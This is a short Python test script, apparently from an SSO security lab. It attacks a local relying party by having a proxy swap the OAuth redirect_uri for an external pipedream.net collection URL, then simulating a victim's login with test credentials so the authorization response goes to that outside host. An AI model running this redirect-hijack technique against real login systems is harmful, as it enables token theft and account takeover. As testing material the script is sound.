import sys
import os
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from browser import BrowserSimulator
from proxy import ProxyClient
import id_token

HONEST_RP_ENDPOINT = "http://localhost:9999"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

# victim credentials
victim_username = 'test-user@localhost'
victim_password = 'verysecure'

proxy_client = ProxyClient(PROXY_EXTENSION_ENDPOINT)

simulator = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)

try:
    # replace redirect_uri
    redirect_uri = 'https://eo2zoljihgn2f5z.m.pipedream.net'
    proxy_client.modify_query_param('redirect_uri', redirect_uri)    

    # browser simulation
    sso_flow = f"""
page.locator('input[name="username"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('button[type="submit"]').click()
print(page.content())
    """
    
    simulator.run(sso_flow)
    simulator.close()

    proxy_client.clean()
except Exception as e:
    print('Error:', e)
    proxy_client.clean()
